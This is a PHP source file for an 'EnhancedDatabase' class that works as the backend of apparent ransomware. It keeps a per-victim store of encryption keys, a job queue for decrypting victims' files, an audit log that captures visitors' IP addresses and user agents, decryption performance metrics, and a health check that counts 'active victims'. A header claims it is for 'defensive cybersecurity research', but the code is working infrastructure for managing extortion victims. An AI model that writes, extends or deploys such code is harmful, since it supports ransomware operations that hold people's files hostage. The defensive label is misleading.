<?php
/**
 * Enhanced Database Manager with Security Improvements
 * Adds encryption, retry mechanisms, and better error handling
 * For defensive cybersecurity research purposes only
 */

require_once 'database.php';

class EnhancedDatabase extends Database {
    private $encryption_key;
    private $redis_client = null;
    
    public function __construct() {
        parent::__construct();
        $this->encryption_key = $this->getOrCreateEncryptionKey();
        $this->initializeRedisCache();
        $this->createEnhancedTables();
    }
    
    private function getOrCreateEncryptionKey() {
        $key_file = 'database_encryption.key';
        
        if (file_exists($key_file)) {
            return file_get_contents($key_file);
        }
        
        // Generate new encryption key
        $key = random_bytes(32);
        file_put_contents($key_file, $key);
        chmod($key_file, 0600); // Restrict access
        
        return $key;
    }
    
    private function initializeRedisCache() {
        if (class_exists('Redis')) {
            try {
                $this->redis_client = new Redis();
                $this->redis_client->connect('127.0.0.1', 6379);
                $this->redis_client->select(1); // Use database 1 for caching
            } catch (Exception $e) {
                error_log("Redis connection failed: " . $e->getMessage());
                $this->redis_client = null;
            }
        }
    }
    
    private function createEnhancedTables() {
        $sql = "
            CREATE TABLE IF NOT EXISTS decryption_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                job_type TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                priority INTEGER DEFAULT 1,
                retry_count INTEGER DEFAULT 0,
                max_retries INTEGER DEFAULT 3,
                payload TEXT,
                error_message TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                started_at DATETIME,
                completed_at DATETIME,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS encryption_keys_secure (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE NOT NULL,
                encrypted_key TEXT NOT NULL,
                key_iv TEXT NOT NULL,
                key_version INTEGER DEFAULT 1,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS system_audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_type TEXT NOT NULL,
                victim_id TEXT,
                user_agent TEXT,
                ip_address TEXT,
                event_data TEXT,
                severity TEXT DEFAULT 'info',
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS decryption_performance (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                files_total INTEGER,
                files_processed INTEGER,
                files_failed INTEGER,
                processing_time_seconds INTEGER,
                throughput_files_per_sec REAL,
                average_file_size_mb REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
        ";
        
        $this->db->exec($sql);
    }
    
    // Enhanced encryption key management
    public function storeEncryptionKeySecure($victim_id, $encryption_key) {
        try {
            // Generate IV for encryption
            $iv = random_bytes(16);
            
            // Encrypt the key
            $encrypted_key = openssl_encrypt(
                $encryption_key, 
                'aes-256-cbc', 
                $this->encryption_key, 
                0, 
                $iv
            );
            
            if ($encrypted_key === false) {
                throw new Exception("Failed to encrypt key");
            }
            
            $stmt = $this->db->prepare("
                INSERT OR REPLACE INTO encryption_keys_secure 
                (victim_id, encrypted_key, key_iv)
                VALUES (?, ?, ?)
            ");
            
            $result = $stmt->execute([
                $victim_id, 
                base64_encode($encrypted_key), 
                base64_encode($iv)
            ]);
            
            // Cache for quick access
            if ($this->redis_client) {
                $this->redis_client->setex("victim_key:$victim_id", 3600, $encryption_key);
            }
            
            return $result;
            
        } catch (Exception $e) {
            error_log("Error storing encryption key: " . $e->getMessage());
            return false;
        }
    }
    
    public function getEncryptionKeySecure($victim_id) {
        try {
            // Check cache first
            if ($this->redis_client) {
                $cached_key = $this->redis_client->get("victim_key:$victim_id");
                if ($cached_key !== false) {
                    return $cached_key;
                }
            }
            
            // Retrieve from database
            $stmt = $this->db->prepare("
                SELECT encrypted_key, key_iv FROM encryption_keys_secure 
                WHERE victim_id = ?
            ");
            $stmt->execute([$victim_id]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if (!$row) {
                // Fallback to original table
                return $this->getVictimDecryptionKey($victim_id);
            }
            
            // Decrypt the key
            $decrypted_key = openssl_decrypt(
                base64_decode($row['encrypted_key']),
                'aes-256-cbc',
                $this->encryption_key,
                0,
                base64_decode($row['key_iv'])
            );
            
            if ($decrypted_key === false) {
                throw new Exception("Failed to decrypt key");
            }
            
            // Update last used timestamp
            $this->db->prepare("
                UPDATE encryption_keys_secure 
                SET last_used = datetime('now') 
                WHERE victim_id = ?
            ")->execute([$victim_id]);
            
            // Cache the decrypted key
            if ($this->redis_client) {
                $this->redis_client->setex("victim_key:$victim_id", 3600, $decrypted_key);
            }
            
            return $decrypted_key;
            
        } catch (Exception $e) {
            error_log("Error retrieving encryption key: " . $e->getMessage());
            return false;
        }
    }
    
    // Job queue system for asynchronous processing
    public function addDecryptionJob($victim_id, $job_type, $payload = null, $priority = 1) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO decryption_jobs 
                (victim_id, job_type, payload, priority)
                VALUES (?, ?, ?, ?)
            ");
            
            return $stmt->execute([
                $victim_id, 
                $job_type, 
                json_encode($payload), 
                $priority
            ]);
            
        } catch (Exception $e) {
            error_log("Error adding decryption job: " . $e->getMessage());
            return false;
        }
    }
    
    public function getNextDecryptionJob() {
        try {
            $stmt = $this->db->prepare("
                SELECT * FROM decryption_jobs 
                WHERE status = 'pending' AND retry_count < max_retries
                ORDER BY priority DESC, created_at ASC 
                LIMIT 1
            ");
            $stmt->execute();
            $job = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if ($job) {
                // Mark as in progress
                $this->updateJobStatus($job['id'], 'in_progress');
            }
            
            return $job;
            
        } catch (Exception $e) {
            error_log("Error getting next job: " . $e->getMessage());
            return false;
        }
    }
    
    public function updateJobStatus($job_id, $status, $error_message = null) {
        try {
            $stmt = $this->db->prepare("
                UPDATE decryption_jobs 
                SET status = ?, error_message = ?,
                    started_at = CASE WHEN status = 'in_progress' THEN datetime('now') ELSE started_at END,
                    completed_at = CASE WHEN status IN ('completed', 'failed') THEN datetime('now') ELSE completed_at END
                WHERE id = ?
            ");
            
            return $stmt->execute([$status, $error_message, $job_id]);
            
        } catch (Exception $e) {
            error_log("Error updating job status: " . $e->getMessage());
            return false;
        }
    }
    
    public function retryFailedJob($job_id) {
        try {
            $stmt = $this->db->prepare("
                UPDATE decryption_jobs 
                SET status = 'pending', 
                    retry_count = retry_count + 1,
                    error_message = NULL
                WHERE id = ? AND retry_count < max_retries
            ");
            
            return $stmt->execute([$job_id]);
            
        } catch (Exception $e) {
            error_log("Error retrying job: " . $e->getMessage());
            return false;
        }
    }
    
    // Enhanced logging and auditing
    public function logSystemEvent($event_type, $victim_id = null, $event_data = null, $severity = 'info') {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO system_audit_log 
                (event_type, victim_id, user_agent, ip_address, event_data, severity)
                VALUES (?, ?, ?, ?, ?, ?)
            ");
            
            return $stmt->execute([
                $event_type,
                $victim_id,
                $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
                $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
                json_encode($event_data),
                $severity
            ]);
            
        } catch (Exception $e) {
            error_log("Error logging system event: " . $e->getMessage());
            return false;
        }
    }
    
    public function recordDecryptionPerformance($victim_id, $performance_data) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO decryption_performance 
                (victim_id, files_total, files_processed, files_failed, 
                 processing_time_seconds, throughput_files_per_sec, average_file_size_mb)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ");
            
            return $stmt->execute([
                $victim_id,
                $performance_data['files_total'] ?? 0,
                $performance_data['files_processed'] ?? 0, 
                $performance_data['files_failed'] ?? 0,
                $performance_data['processing_time'] ?? 0,
                $performance_data['throughput'] ?? 0,
                $performance_data['avg_file_size'] ?? 0
            ]);
            
        } catch (Exception $e) {
            error_log("Error recording performance data: " . $e->getMessage());
            return false;
        }
    }
    
    // Retry mechanism with exponential backoff
    public function executeWithRetry($operation, $max_retries = 3, $base_delay = 1) {
        $attempt = 0;
        
        while ($attempt < $max_retries) {
            try {
                return $operation();
            } catch (Exception $e) {
                $attempt++;
                
                if ($attempt >= $max_retries) {
                    throw $e;
                }
                
                $delay = $base_delay * pow(2, $attempt - 1);
                sleep($delay);
                
                error_log("Retry attempt $attempt/$max_retries after {$delay}s delay: " . $e->getMessage());
            }
        }
        
        return false;
    }
    
    // Key validation
    public function validateDecryptionKey($key) {
        if (empty($key)) {
            return false;
        }
        
        // Check key format (hex)
        if (!ctype_xdigit($key)) {
            return false;
        }
        
        // Check key length (32 bytes = 64 hex chars)
        if (strlen($key) !== 64) {
            return false;
        }
        
        return true;
    }
    
    // Health check methods
    public function getSystemHealth() {
        $health = [
            'database' => 'ok',
            'cache' => $this->redis_client ? 'ok' : 'unavailable',
            'pending_jobs' => 0,
            'failed_jobs' => 0,
            'active_victims' => 0,
            'disk_space' => 'ok'
        ];
        
        try {
            // Check pending jobs
            $stmt = $this->db->prepare("SELECT COUNT(*) FROM decryption_jobs WHERE status = 'pending'");
            $stmt->execute();
            $health['pending_jobs'] = $stmt->fetchColumn();
            
            // Check failed jobs
            $stmt = $this->db->prepare("SELECT COUNT(*) FROM decryption_jobs WHERE status = 'failed'");
            $stmt->execute();
            $health['failed_jobs'] = $stmt->fetchColumn();
            
            // Check active victims
            $health['active_victims'] = $this->getActiveVictims();
            
            // Check disk space
            $free_space = disk_free_space('/tmp');
            $total_space = disk_total_space('/tmp');
            $usage_percent = (1 - $free_space / $total_space) * 100;
            
            if ($usage_percent > 90) {
                $health['disk_space'] = 'critical';
            } elseif ($usage_percent > 75) {
                $health['disk_space'] = 'warning';
            }
            
        } catch (Exception $e) {
            $health['database'] = 'error: ' . $e->getMessage();
        }
        
        return $health;
    }
    
    public function __destruct() {
        if ($this->redis_client) {
            $this->redis_client->close();
        }
        parent::__destruct();
    }
}
?>